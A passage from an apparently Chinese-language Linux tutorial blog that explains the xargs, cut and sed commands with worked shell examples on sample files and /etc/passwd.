</span>root root    <span class="number"> 14112 </span>Nov <span class="number"> 2 </span><span class="number"> 2010 </span>/sbin/pam_timestamp_check</span><br><span class="line">-rwsr-xr-x<span class="number"> 1 </span>root root    <span class="number"> 75504 </span>Jan <span class="number"> 9 </span><span class="number"> 2013 </span>/sbin/umount.nfs</span><br><span class="line">-rwsr-xr-x<span class="number"> 1 </span>root root    <span class="number"> 75504 </span>Jan <span class="number"> 9 </span><span class="number"> 2013 </span>/sbin/umount.nfs4</span><br><span class="line">-rwsr-xr-x<span class="number"> 1 </span>root root    <span class="number"> 19768 </span>Nov <span class="number"> 2 </span><span class="number"> 2010 </span>/sbin/unix_chkpwd</span><br><span class="line">123456789</span><br></pre></td></tr></table></figure>
<p>如果没有xargs，ls -l的结果将不是前面find的标准输出，因为ls不支持管道命令。</p>
<p>xargs 用作替换工具，读取输入数据重新格式化后输出。</p>
<p>定义一个测试文件，内有多行文本数据：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"># cat test<span class="selector-class">.txt</span></span><br><span class="line"><span class="selector-tag">a</span> <span class="selector-tag">b</span> c d e f <span class="selector-tag">g</span></span><br><span class="line">h <span class="selector-tag">i</span> j k l m n</span><br><span class="line">o <span class="selector-tag">p</span> <span class="selector-tag">q</span></span><br><span class="line"><span class="attribute">r</span> s t</span><br><span class="line">u v w <span class="attribute">x</span> <span class="attribute">y</span> z</span><br><span class="line"><span class="number">123456</span></span><br></pre></td></tr></table></figure>
<p>多行输入单行输出：</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"># <span class="selector-tag">cat</span> <span class="selector-tag">test</span><span class="selector-class">.txt</span> | <span class="selector-tag">xargs</span></span><br><span class="line"><span class="selector-tag">a</span> <span class="selector-tag">b</span> <span class="selector-tag">c</span> <span class="selector-tag">d</span> <span class="selector-tag">e</span> <span class="selector-tag">f</span> <span class="selector-tag">g</span> <span class="selector-tag">h</span> <span class="selector-tag">i</span> <span class="selector-tag">j</span> <span class="selector-tag">k</span> <span class="selector-tag">l</span> <span class="selector-tag">m</span> <span class="selector-tag">n</span> <span class="selector-tag">o</span> <span class="selector-tag">p</span> <span class="selector-tag">q</span> <span class="selector-tag">r</span> <span class="selector-tag">s</span> <span class="selector-tag">t</span> <span class="selector-tag">u</span> <span class="selector-tag">v</span> <span class="selector-tag">w</span> <span class="selector-tag">x</span> <span class="selector-tag">y</span> <span class="selector-tag">z</span></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
<p>-n 选项多行输出：</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"># <span class="selector-tag">cat</span> <span class="selector-tag">test</span><span class="selector-class">.txt</span> | <span class="selector-tag">xargs</span> <span class="selector-tag">-n3</span></span><br><span class="line"><span class="selector-tag">a</span> <span class="selector-tag">b</span> <span class="selector-tag">c</span></span><br><span class="line"><span class="selector-tag">d</span> <span class="selector-tag">e</span> <span class="selector-tag">f</span></span><br><span class="line"><span class="selector-tag">g</span> <span class="selector-tag">h</span> <span class="selector-tag">i</span></span><br><span class="line"><span class="selector-tag">j</span> <span class="selector-tag">k</span> <span class="selector-tag">l</span></span><br><span class="line"><span class="selector-tag">m</span> <span class="selector-tag">n</span> <span class="selector-tag">o</span></span><br><span class="line"><span class="selector-tag">p</span> <span class="selector-tag">q</span> <span class="selector-tag">r</span></span><br><span class="line"><span class="selector-tag">s</span> <span class="selector-tag">t</span> <span class="selector-tag">u</span></span><br><span class="line"><span class="selector-tag">v</span> <span class="selector-tag">w</span> <span class="selector-tag">x</span></span><br><span class="line"><span class="selector-tag">y</span> <span class="selector-tag">z</span></span><br><span class="line"><span class="number">12345678910</span></span><br></pre></td></tr></table></figure>
<p>-d 选项可以自定义一个定界符：</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="meta"># echo <span class="string">&quot;nameXnameXnameXname&quot;</span> | xargs -dX</span></span><br><span class="line"><span class="built_in">name</span> <span class="built_in">name</span> <span class="built_in">name</span> <span class="built_in">name</span></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
<p>结合 -n 选项使用：</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="meta"># echo <span class="string">&quot;nameXnameXnameXname&quot;</span> | xargs -dX -n2</span></span><br><span class="line"><span class="built_in">name</span> <span class="built_in">name</span></span><br><span class="line"><span class="built_in">name</span> <span class="built_in">name</span></span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>
<p>读取 stdin，将格式化后的参数传递给命令:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> sk.sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">sk.sh命令内容，打印出所有参数。</span></span><br><span class="line">echo $*</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> arg.txt</span></span><br><span class="line">aaa</span><br><span class="line">bbb</span><br><span class="line">ccc</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> arg.txt | xargs -I &#123;&#125; ./sk.sh -p &#123;&#125; -l</span></span><br><span class="line">-p aaa -l</span><br><span class="line">-p bbb -l</span><br><span class="line">-p ccc -l</span><br><span class="line">123456789101112</span><br></pre></td></tr></table></figure>
<p>选项<code>-I</code>指定一个替换字符串 {}，这个字符串在 xargs 扩展时会被替换掉。</p>
<p>复制所有图片文件到 /data/images 目录下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> *.jpg | xargs -n1 -I &#123;&#125; <span class="built_in">cp</span> &#123;&#125; /data/images</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<p>选项<code>-n</code> 后面加次数，表示命令在执行的时候一次用的argument的个数，默认是用所有的。</p>
<p><strong>xargs 结合 find 使用</strong></p>
<p>用 rm 删除太多的文件时候，可能得到一个错误信息：<strong>/bin/rm Argument list too long.</strong> 用 xargs 去避免这个问题：</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">find . -<span class="keyword">type</span> <span class="type">f </span>-name <span class="string">&quot;*.log&quot;</span> -print0 | xargs -<span class="number">0</span> rm -f</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>xargs -0 将 \0 作为定界符。</p>
<p>统计一个源代码目录中所有 php 文件的行数：</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">find . -<span class="keyword">type</span> <span class="type">f </span>-name <span class="string">&quot;*.php&quot;</span> -print0 | xargs -<span class="number">0</span> wc -l</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>查找所有的 jpg 文件，并且压缩它们：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> . -type f -name <span class="string">&quot;*.jpg&quot;</span> -<span class="built_in">print</span> | xargs tar -czvf images.tar.gz</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<p>批量下载：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> url-list.txt | xargs wget -c</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<p>wget的<code>-c</code>选项表示断点续传。</p>
<h2 id="文本编辑命令">文本编辑命令</h2>
<h3 id="cut命令">cut命令</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">选项与参数：</span><br><span class="line">-d  ：后面接分隔字符。与 -f 一起使用；</span><br><span class="line">-f  ：依据 -d 的分隔字符将一段信息分割成为数段，用 -f 取出第几段的意思；</span><br><span class="line">-c  ：以字符 (characters) 的单位取出固定字符区间；</span><br></pre></td></tr></table></figure>
<p>cut以行为单位，根据分隔符把行分成若干列，这样就可以指定选取哪些列了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cut</span> -d <span class="string">&#x27;分隔字符&#x27;</span> -f 选取的列数</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>|<span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 2  	--选取第2列</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>|<span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 3,5  	--选取第3列和第5列</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>|<span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 3-5  	--选取第3列到第5列</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>|<span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 3-   	--选取第3列到最后1列</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>|<span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 1-3,5	--选取第1到第3列还有第5列</span><br></pre></td></tr></table></figure>
<p>只显示/etc/passwd的用户和shell：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cat /etc/passwd | cut -d &#x27;:&#x27; -f 1,7 </span></span><br><span class="line">root:/bin/bash</span><br><span class="line">daemon:/bin/sh</span><br><span class="line">bin:/bin/sh</span><br></pre></td></tr></table></figure>
<h3 id="sed命令">sed命令</h3>
<p>sed 可依照脚本的指令来处理、编辑文本文件。</p>
<p>Sed 主要用来自动编辑一个或多个文件、简化对文件的反复操作、编写转换程序等。</p>
<p>语法:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed [-e&lt;script&gt;][-f&lt;script文件&gt;][文本文件]</span><br></pre></td></tr></table></figure>
<p><strong>参数说明</strong>：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>-e &lt;script&gt;</code>以指定的script来处理输入的文本文件。</p>
</li>
<li class="lvl-2">
<p><code>-f&lt;script文件&gt;</code>以指定的script文件来处理输入的文本文件。</p>
</li>
<li class="lvl-2">
<p><code>-n</code>仅显示script处理后的结果，一般跟p动作搭配使用。</p>
</li>
<li class="lvl-2">
<p><code>-i</code>使用处理后的结果修改文件。</p>
</li>
</ul>
<p><strong>动作说明</strong>：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>a：在指定行后面插入内容</p>
</li>
<li class="lvl-2">
<p>i：在指定行前面插入内容</p>
</li>
<li class="lvl-2">
<p>d：删除指定行</p>
</li>
<li class="lvl-2">
<p>c ：替换指定行</p>
</li>
<li class="lvl-2">
<p>p ：打印指定行的数据，通常需要跟<code>-n</code>选项搭配使用</p>
</li>
<li class="lvl-2">
<p>s ：替换指定字符，兼容vim的替换语法，例如 1,20s/old/new/g</p>
</li>
</ul>
<h4 id="元字符集">元字符集</h4>
<p>sed支持一般的正则表达式，下面是支持的正则语法：<code>^</code>行的开始 如：/^sed/匹配所有以sed开头的行。<code>$</code>行的结束 如：/sed$/匹配所有以sed结尾的行。<code>.</code>匹配一个非换行符的任意字符 如：/s.d/匹配s后接一个任意字符，然后是d。<code>*</code>匹配零或多个字符 如：/*sed/匹配所有模板是一个或多个空格后紧跟sed的行。<code>[]</code>匹配一个指定范围内的字符，如<code>/[Ss]ed/</code>匹配sed和Sed。<code>[^]</code>匹配一个不在指定范围内的字符，如：<code>/[^A-RT-Z]ed/</code>匹配不包含A-R和T-Z的一个字母开头，紧跟ed的行。<code>\(..\)</code>保存匹配的字符，如s/(love)able/\1rs，loveable被替换成lovers。<code>&amp;</code>保存搜索字符用来替换其他字符，如<code>s/love/**&amp;**/</code>，love这成<code>**love**</code>。<code>\&lt;</code>单词的开始，如:/&lt;love/匹配包含以love开头的单词的行。<code>\&gt;</code>单词的结束，如/love&gt;/匹配包含以love结尾的单词的行。<code>x\+</code>重复字符x，至少1次，如：<code>/o\+/</code>匹配至少有1个o的行。<code>x\&#123;m\&#125;</code>重复字符x，m次，如：<code>/o\&#123;5\&#125;/</code>匹配包含5个o的行。<code>x\&#123;m,\&#125;</code>重复字符x,至少m次，如：<code>/o\&#123;5,\&#125;/</code>匹配至少有5个o的行。<code>x\&#123;m,n\&#125;</code>重复字符x，至少m次，不多于n次，如：<code>/o\&#123;5,10\&#125;/</code>匹配5-10个o的行。</p>
<h4 id="a-i-在指定行位置添加行">a|i:在指定行位置添加行</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:Corazon]# <span class="built_in">cat</span> a</span><br><span class="line">LINUX!  </span><br><span class="line"> Linux is a free unix-type opterating system.  </span><br><span class="line"> This is a linux testfile!  </span><br><span class="line"> Linux <span class="built_in">test</span> </span><br><span class="line"></span><br><span class="line">[root@rocky8:Corazon]# sed -e 2a\newline a</span><br><span class="line">LINUX!  </span><br><span class="line"> Linux is a free unix-type opterating system.  </span><br><span class="line">newline</span><br><span class="line"> This is a linux testfile!  </span><br><span class="line"> Linux <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<p>默认情况下<code>-e</code>参数可以省略：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:Corazon]# <span class="built_in">cat</span> a | sed <span class="string">&#x27;2a\newline&#x27;</span></span><br><span class="line">LINUX!  </span><br><span class="line"> Linux is a free unix-type opterating system.  </span><br><span class="line">newline</span><br><span class="line"> This is a linux testfile!  </span><br><span class="line"> Linux <span class="built_in">test</span> </span><br><span class="line">[root@rocky8:~]# sed 2a\newline a</span><br><span class="line">NUX!  </span><br><span class="line"> Linux is a free unix-type opterating system.  </span><br><span class="line">newline</span><br><span class="line"> This is a linux testfile!  </span><br><span class="line"> Linux <span class="built_in">test</span></span><br><span class="line">[root@rocky8:Corazon]# sed <span class="string">&#x27;2a newline&#x27;</span> a</span><br><span class="line">LINUX!  </span><br><span class="line"> Linux is a free unix-type opterating system.  </span><br><span class="line">newline</span><br><span class="line"> This is a linux testfile!  </span><br><span class="line"> Linux <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<p>在第二行之前添加一行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:Corazon]# sed <span class="string">&#x27;2i newline&#x27;</span> a</span><br><span class="line">LINUX!  </span><br><span class="line">newline</span><br><span class="line"> Linux is a free unix-type opterating system.  </span><br><span class="line"> This is a linux testfile!  </span><br><span class="line"> Linux <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<p>最后一行加入 <code># This is a test</code>:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:Corazon]# sed <span class="string">&#x27;$a # This is a test&#x27;</span> a</span><br><span class="line">LINUX!  </span><br><span class="line"> Linux is a free unix-type opterating system.  </span><br><span class="line"> This is a linux testfile!  </span><br><span class="line"> Linux <span class="built_in">test</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># This is a test</span></span><br></pre></td></tr></table></figure>
<p>同时添加多行：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">[root@rocky8:Corazon]# cat a|sed <span class="string">&#x27;2a\newline1\</span></span><br><span class="line"><span class="string">&gt; newline2&#x27;</span></span><br><span class="line">LINUX!  </span><br><span class="line"> Linux <span class="keyword">is</span> a free unix-<span class="keyword">type</span> opterating <span class="keyword">system</span>.  </span><br><span class="line">newline1</span><br><span class="line">newline2</span><br><span class="line"> This <span class="keyword">is</span> a linux testfile!  </span><br><span class="line"> Linux test</span><br></pre></td></tr></table></figure>
<h4 id="d-删除指定行">d:删除指定行</h4>
<p>将 /etc/passwd 的内容列出行号，并将第 2~5 行删除！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">nl</span> /etc/passwd|sed <span class="string">&#x27;2,5d&#x27;</span></span><br><span class="line">     1	root:x:0:0:root:/root:/bin/bash</span><br><span class="line">     6	<span class="built_in">sync</span>:x:5:0:<span class="built_in">sync</span>:/sbin:/bin/sync</span><br><span class="line">     7	shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">.....(后面省略).....</span><br></pre></td></tr></table></figure>
<p>只删除第2行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nl</span> /etc/passwd | sed <span class="string">&#x27;2d&#x27;</span> </span><br></pre></td></tr></table></figure>
<p>删除第3到最后一行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nl</span> /etc/passwd | sed <span class="string">&#x27;3,$d&#x27;</span> </span><br></pre></td></tr></table></figure>
<p>删除/etc/passwd所有包含<code>/sbin/nologin</code>的行，其他行输出：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">nl</span> /etc/passwd|sed <span class="string">&#x27;/\/sbin\/nologin/d&#x27;</span></span><br><span class="line">     1	root:x:0:0:root:/root:/bin/bash</span><br><span class="line">     6	<span class="built_in">sync</span>:x:5:0:<span class="built_in">sync</span>:/sbin:/bin/sync</span><br><span class="line">     7	shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">     8	halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">    25	zah:x:1000:1000:Zah:/home/zah:/bin/bash</span><br><span class="line">    26	Cora:x:1002:1002::/home/Cora:/bin/bash</span><br><span class="line">    27	Corazon:x:1003:1003::/home/Corazon:/bin/bash</span><br></pre></td></tr></table></figure>
<h4 id="c-替换指定行">c:替换指定行</h4>
<p>将第2-5行的内容替换成为『No 2-5 number』：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">nl</span> /etc/passwd|sed <span class="string">&#x27;2,5c No 2-5 number&#x27;</span></span><br><span class="line">     1	root:x:0:0:root:/root:/bin/bash</span><br><span class="line">No 2-5 number</span><br><span class="line">     6	<span class="built_in">sync</span>:x:5:0:<span class="built_in">sync</span>:/sbin:/bin/sync</span><br></pre></td></tr></table></figure>
<h4 id="p-仅显示指定行">p:仅显示指定行</h4>
<p>不加<code>-n</code>选项时，除了输出匹配行，还同时会输出所有行，所以需要加<code>-n</code>选项。</p>
<p>仅列出 /etc/passwd 文件内的第 5-7 行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">nl</span> /etc/passwd|sed -n <span class="string">&#x27;5,7p&#x27;</span></span><br><span class="line">     5	lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line">     6	<span class="built_in">sync</span>:x:5:0:<span class="built_in">sync</span>:/sbin:/bin/sync</span><br><span class="line">     7	shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br></pre></td></tr></table></figure>
<p>搜索 /etc/passwd有root关键字的行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> /etc/passwd|sed -n <span class="string">&#x27;/root/p&#x27;</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">operator:x:11:0:operator:/root:/sbin/nologin</span><br><span class="line">[root@rocky8:~]# sed -n <span class="string">&#x27;/root/p&#x27;</span> /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">operator:x:11:0:operator:/root:/sbin/nologin</span><br></pre></td></tr></table></figure>
<p>打印/etc/passwd有以root和bin开头之间的行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# sed -n <span class="string">&#x27;/^root/,/^bin/p&#x27;</span> /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br></pre></td></tr></table></figure>
<p>打印从第五行开始到第一个包含以<code>/usr/games</code>开始的行之间的所有行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">nl</span> /etc/passwd | sed -n <span class="string">&#x27;5,\/usr\/games/p&#x27;</span></span><br><span class="line">     5	lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line">     6	<span class="built_in">sync</span>:x:5:0:<span class="built_in">sync</span>:/sbin:/bin/sync</span><br><span class="line">     7	shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">     8	halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">     9	mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><br><span class="line">    10	operator:x:11:0:operator:/root:/sbin/nologin</span><br><span class="line">    11	games:x:12:100:games:/usr/games:/sbin/nologin</span><br></pre></td></tr></table></figure>
<h4 id="s-字符串替换">s:字符串替换</h4>
<p>语法：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sed</span> <span class="string">&#x27;s/要被取代的字串/新的字串/g&#x27;</span></span><br></pre></td></tr></table></figure>
<p>不论什么字符，紧跟着s命令的都被认为是新的分隔符.</p>
<p><code>sed 's#10#100#g'</code>表示把所有10替换成100，“#”在这里是分隔符，代替了默认的“/”分隔符。</p>
<p>提取本机所有的ip地址：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# ifconfig | grep <span class="string">&#x27;inet &#x27;</span></span><br><span class="line">        inet 10.0.0.191  netmask 255.255.255.0  broadcast 10.0.0.255</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">[root@rocky8:~]# ifconfig | grep <span class="string">&#x27;inet &#x27;</span>|sed <span class="string">&#x27;s/^[^0-9]*\([0-9\.]*\).*$/\1/g&#x27;</span></span><br><span class="line">10.0.0.191</span><br><span class="line">127.0.0.1</span><br></pre></td></tr></table></figure>
<p>对于以root和bin开头之间的行，每行的末尾添加sed test：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> /etc/passwd | sed <span class="string">&#x27;/^root/,/^bin/s/$/--sed test/&#x27;</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash--sed <span class="built_in">test</span></span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin--sed <span class="built_in">test</span></span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin--sed <span class="built_in">test</span></span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<h4 id="y-单字符替换">y:单字符替换</h4>
<p>跟s一样也用于替换，不过s替换的是整体，y替换的是每一字母对应的单个字母</p>
<p>把data中的第一行至第三行中的a替换成A，b替换成B，c替换成C：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed <span class="string">&#x27;1,3y/abc/ABC/&#x27;</span> data </span><br></pre></td></tr></table></figure>
<p>示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">echo</span> <span class="string">&quot;123&quot;</span> | sed <span class="string">&#x27;y/13/34/&#x27;</span></span><br><span class="line">324</span><br><span class="line">[root@rocky8:~]# <span class="built_in">echo</span> <span class="string">&quot;axxbxxcxx&quot;</span> | sed <span class="string">&#x27;y/abc/123/&#x27;</span></span><br><span class="line">1xx2xx3xx</span><br></pre></td></tr></table></figure>
<p><font class="notice">注：单个字符转换用y，字符串转换用<code>'s/str1/str2/g'</code></font></p>
<h4 id="hHgG模式空间与保持空间"><code>hHgG</code>模式空间与保持空间</h4>
<p>首先介绍一下模式空间和保持空间:</p>
<blockquote>
<p><strong>（H、h、G、g、x）</strong><br>
<strong>模式空间：</strong><a href="https://so.csdn.net/so/search?q=sed&amp;spm=1001.2101.3001.7020">sed</a>处理文本内容行的一个临时缓冲区，模式空间中的内容会主动打印到标准输出，并自动清空模式空间</p>
<p>**保持空间：**sed处理文本内容行的另一个临时缓冲区，不同的是保持空间内容不会主动清空，也不会主动打印到标准输出，而是需要<a href="https://so.csdn.net/so/search?q=sed%E5%91%BD%E4%BB%A4&amp;spm=1001.2101.3001.7020">sed命令</a>来进行处理</p>
</blockquote>
<p>模式空间与保持空间的关系:</p>
<blockquote>
<p>**模式空间：**相当于流水线，文本行再模式空间中进行处理；<br>
**保持空间：**相当于仓库，在模式空间对数据进行处理时，可以把数据临时存储到保持空间；作为模式空间的一个辅助临时缓冲区，但又是相互独立，可以进行交互，命令可以寻址模式空间但是不能寻址保持空间。可以使用高级命令h,H,g,G与模式空间进行交互。</p>
</blockquote>
<p>实际上， 保持空间是模式空间一个临时存放数据的缓冲区，协助模式空间进行数据处理。</p>
<p>相关命令的作用：</p>
<blockquote>
<p><strong>d</strong>     Delete pattern space.  Start next cycle.<br>
删除pattern space的内容，开始下一个循环</p>
<p><strong>h H</strong>   Copy/append pattern space to hold space.<br>
复制/追加pattern space的内容到hold space.（复制会覆盖原内容）</p>
<p><strong>g G</strong>   Copy/append hold space to pattern space.<br>
复制/追加hold space的内容到pattern space. （复制会覆盖原内容）</p>
<p><strong>x</strong>    Exchange the contents of the  hold  and  pattern spaces.<br>
交换hold space和pattern space的内容.</p>
</blockquote>
<p>h命令是将当前模式空间中内容覆盖至保持空间，H命令是将当前模式空间中的内容追加至保持空间</p>
<p>g命令是将当前保持空间中内容覆盖至模式空间，G命令是将当前保持空间中的内容追加至模式空间</p>
<p>模拟tac命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> num</span><br><span class="line">One</span><br><span class="line">Two</span><br><span class="line">Three</span><br><span class="line">[root@rocky8:~]# <span class="built_in">tac</span> num</span><br><span class="line">Three</span><br><span class="line">Two</span><br><span class="line">One</span><br><span class="line">[root@rocky8:~]# sed <span class="string">&#x27;1!G;h;$!d&#x27;</span> num</span><br><span class="line">Three</span><br><span class="line">Two</span><br><span class="line">One</span><br></pre></td></tr></table></figure>
<p>1!G第1行不 执行“G”命令，从第2行开始执行。</p>
<p>$!d，最后一行不删除（保留最后1行）（只有最后一行不删）</p>
<p>原理图：</p>
<p><img src="/posts/247a4e5f//image-20250219211455837.png" alt="image-20250219211455837"></p>
<p>递增序列：</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@rocky8</span>:~]<span class="meta"># seq 3|sed <span class="string">&#x27;H;g&#x27;</span></span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line">[root<span class="symbol">@rocky8</span>:~]<span class="meta"># seq 3|sed <span class="string">&#x27;1h;1!H;g&#x27;</span></span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>
<h4 id="多次指定-e选项进行多点编辑">多次指定<code>-e</code>选项进行多点编辑</h4>
<p>删除/etc/passwd第三行到末尾的数据，并把bash替换为blueshell：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">nl</span> /etc/passwd | sed -e <span class="string">&#x27;3,$d&#x27;</span> -e <span class="string">&#x27;s/bash/blueshell/&#x27;</span></span><br><span class="line">     1	root:x:0:0:root:/root:/bin/blueshell</span><br><span class="line">     2	daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br></pre></td></tr></table></figure>
<p>删除一个文件以#开头的行和空行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> abc</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line">a</span><br><span class="line"></span><br><span class="line"><span class="comment"># aaa</span></span><br><span class="line"></span><br><span class="line">ddd</span><br><span class="line"></span><br><span class="line"><span class="comment"># sss</span></span><br><span class="line">eeee</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@rocky8:~]# sed -e <span class="string">&#x27;/^#/d&#x27;</span> -e <span class="string">&#x27;/^$/d&#x27;</span> abc</span><br><span class="line">b</span><br><span class="line">a</span><br><span class="line">ddd</span><br><span class="line">eeee</span><br></pre></td></tr></table></figure>
<p>也可以通过<code>;</code>实现</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">nl</span> /etc/passwd|sed <span class="string">&#x27;3,$d;s/bash/blueshell/&#x27;</span> </span><br><span class="line">     1	root:x:0:0:root:/root:/bin/blueshell</span><br><span class="line">     2	daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">[root@rocky8:~]# sed <span class="string">&#x27;/^#/d;/^$/d&#x27;</span> abc</span><br><span class="line">b</span><br><span class="line">a</span><br><span class="line">ddd</span><br><span class="line">eeee</span><br></pre></td></tr></table></figure>
<h4 id="选项-i直接修改文件内容">选项<code>-i</code>直接修改文件内容</h4>
<p>默认情况下sed命令仅仅只是将处理结果显示在控制台，加<code>-i</code>选项则会修改文件内容。</p>
<p>将 regular_express.txt 内每一行结尾若为 . 则换成 !</p>
